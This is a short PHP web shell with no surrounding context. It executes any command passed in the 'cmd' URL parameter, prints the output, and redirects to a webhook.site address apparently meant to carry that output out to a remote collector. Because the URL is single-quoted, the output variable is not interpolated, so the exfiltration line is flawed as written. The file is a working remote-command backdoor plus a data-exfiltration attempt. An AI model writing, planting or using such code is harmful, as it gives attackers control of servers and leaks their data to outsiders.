<?php
exec($_GET['cmd'], $output);
print_r($output);
header('Location: https://webhook.site/#!/2851ed6c-0367-4494-b3e0-7045d9601432/4add0298-4bd2-40c5-b2cb-dd4bed37257b/1/$output')
?>
